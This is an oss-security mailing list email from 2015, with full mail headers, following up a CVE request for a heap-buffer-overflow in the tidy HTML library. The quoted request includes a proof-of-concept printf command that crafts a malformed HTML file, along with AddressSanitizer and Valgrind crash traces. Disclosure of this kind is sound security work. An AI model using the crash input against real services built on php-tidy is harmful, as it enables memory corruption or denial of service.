X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["2825" "Tuesday" "16" "June" "2015" "23:14:48" "-0500" "=?UTF-8?B?RmVybmFuZG8gTXXDsW96?=" "fernando@null-life.com" "<CAEr-gPHWcYrk2+JCLYGQsDbTTh5OH94tMBQejjt3sbP_f9p2Xw@mail.gmail.com>" "80" "[oss-security] Re: CVE Request - tidy 0.99 / tidy5 heap-buffer-overflow" nil nil nil "6" "2015061704:14:48" "[oss-security] Re: CVE Request - tidy 0.99 / tidy5 heap-buffer-overflow" (number mark "        fernando@nul Jun 16   80/2825  " thread-indent "\"[oss-security] Re: CVE Request - tidy 0.99 / tidy5 heap-buffer-overflow\"\n") "<CAEr-gPENyN7yex+Ra7UWMaLTAzVKA+9+YNX=H7jcY4G6CsfPLQ@mail.gmail.com>" ("<CAEr-gPENyN7yex+Ra7UWMaLTAzVKA+9+YNX=H7jcY4G6CsfPLQ@mail.gmail.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
Received: (qmail 20255 invoked by uid 550); 17 Jun 2015 04:15:01 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 20233 invoked from network); 17 Jun 2015 04:15:00 -0000
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20130820;
        h=x-gm-message-state:mime-version:in-reply-to:references:date
         :message-id:subject:from:to:content-type:content-transfer-encoding;
        bh=0ZGZ9GkOOGlcr1KWeDNZhx7cZ90qX+vdvbr8664RDl4=;
        b=j/Dyi4NrQe+zaGWqEv88IcyMD8HHav0t0EtNYMRa63EklqC9xtnQHDzPuZx6dIQAu6
         +8XWHrFT+yyZL9DuJwSO9KiyWESaVQzj+paEHW4KzEHzt68cvdSDU4cSlUbHEAqbD810
         v2e7IKjKAwNIb5gnrJDHhpDMeTkjJHcbur4O+S+r3AYVBJEzRv30E9fef5W9Mb0zQT9+
         4uJY2rSu5cz2OsmN3kw95C1z51z7D+w4qrdknnTaV8rJn+KW0BcP9+QLEE/yLQuIkkgY
         KFbaGSUyZm2dwGpDmeXVUhNhYketX/0IDCXHmwhWu+uSMwShLLkDyeTLnsjcWWhFh4pS
         l2qg==
X-Gm-Message-State: ALoCoQkPrAgrnV23W+IxgWBwKJo8llGdBz6pXn7iAzQlvHRbScZRl0KgaoUBsr/uOyqnin+ScxDW
MIME-Version: 1.0
X-Received: by 10.107.170.65 with SMTP id t62mr4965452ioe.71.1434514488720;
 Tue, 16 Jun 2015 21:14:48 -0700 (PDT)
X-Originating-IP: [186.29.86.239]
In-Reply-To: <CAEr-gPENyN7yex+Ra7UWMaLTAzVKA+9+YNX=H7jcY4G6CsfPLQ@mail.gmail.com>
References: <CAEr-gPENyN7yex+Ra7UWMaLTAzVKA+9+YNX=H7jcY4G6CsfPLQ@mail.gmail.com>
Message-ID: <CAEr-gPHWcYrk2+JCLYGQsDbTTh5OH94tMBQejjt3sbP_f9p2Xw@mail.gmail.com>
Content-Type: text/plain; charset=UTF-8
Content-Transfer-Encoding: quoted-printable
Date: Tue, 16 Jun 2015 23:14:48 -0500
From: =?UTF-8?Q?Fernando_Mu=C3=B1oz?= <fernando@null-life.com>
Reply-To: oss-security@lists.openwall.com
Subject: [oss-security] Re: CVE Request - tidy 0.99 / tidy5 heap-buffer-overflow
To: oss-security@lists.openwall.com, cve-assign@mitre.org

Any update about a CVE ID for this issue?

I forgot to mention, this could be also abused on PHP based
applications that use php-tidy extension with user supplied data.

On Thu, Jun 4, 2015 at 12:50 AM, Fernando Mu=C3=B1oz <fernando@null-life.co=
m> wrote:
> Hello ,
>
> I'd like to request a CVE ID for the following issue:
>
> tidy [1]  is affected by a write out of bounds when processing
> malformed html files.
> This issue could be abused on server side applications that use
> php-tidy extension with user input.
>
> The issue was confirmed, analysed and fixed by the tidy5 maintainer. [2]
>
> POC
>
> $ printf "\x3c\x61\x20\x62\x3d\x3c\x61\x20\x3c\x3f\x78\x6d
> \x0d\x3f\x3e\x62\x3d\x22\x63\x22\x47\x20\x68\x72\x65
> \x66\x3d\x22\x12\x22\xbb" > err.html
>
> An asan-enabled build of tidy outputs:
>
> $ tidy-asan err.html
> =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D
> =3D=3D2196=3D=3DERROR: AddressSanitizer: heap-buffer-overflow on address
> 0xb53006b1 at pc 0xb71df8fe bp 0xbfac9928 sp 0xbfac9918
> WRITE of size 1 at 0xb53006b1 thread T0
>     #0 0xb71df8fd in prvTidytmbstrndup (/usr/lib/libtidy-0.99.so.0+0x15c8=
fd)
>     #1 0xb7141060 in prvTidyGetToken (/usr/lib/libtidy-0.99.so.0+0xbe060)
>     #2 0xb711856e in prvTidyParseDocument (/usr/lib/libtidy-0.99.so.0+0x9=
556e)
>     #3 0xb71f2a58 in prvTidyDocParseStream (/usr/lib/libtidy-0.99.so.0+0x=
16fa58)
>     #4 0xb71f34a5 in tidyParseFile (/usr/lib/libtidy-0.99.so.0+0x1704a5)
>     #5 0x804bfa9 (/usr/bin/tidy+0x804bfa9)
>     #6 0xb6edf72d in __libc_start_main (/lib/i386-linux-gnu/libc.so.6+0x1=
872d)
>     #7 0x804fa4e (/usr/bin/tidy+0x804fa4e)
>
> 0xb53006b1 is located 0 bytes to the right of 1-byte region
> [0xb53006b0,0xb53006b1)
> allocated by thread T0 here:
>     #0 0xb72af18c in __interceptor_malloc
> (/usr/lib/i386-linux-gnu/libasan.so.1+0x5118c)
>     #1 0xb71c5963 (/usr/lib/libtidy-0.99.so.0+0x142963)
> ...
>
> Valgrind with the standard build:
>
> $ valgrind tidy err.html
> ...
> =3D=3D30499=3D=3D Invalid write of size 1
> =3D=3D30499=3D=3D    at 0x408805C: prvTidytmbstrndup (tmbstr.c:39)
> =3D=3D30499=3D=3D    by 0x40738A8: ParseValue (lexer.c:3486)
> ...
>
> =3D=3D30499=3D=3D Invalid write of size 1
> =3D=3D30499=3D=3D    at 0x4088065: prvTidytmbstrndup (tmbstr.c:41)
> =3D=3D30499=3D=3D    by 0x40738A8: ParseValue (lexer.c:3486)
> =3D=3D30499=3D=3D    by 0x4075F39: ParseAttrs (lexer.c:3603)
> =3D=3D30499=3D=3D    by 0x4075F39: GetTokenFromStream (lexer.c:2416)
>
> ...
> file: tmbstr.c
>
> 39        while ( len-- > 0 &&  (*cp++ =3D *str++) )
> 40          /**/;
> 41        *cp =3D 0;
>
> Credit: Fernando Mu=C3=B1oz
>
> [1] tidy.sourceforge.net
> [2] https://github.com/htacg/tidy-html5/issues/217
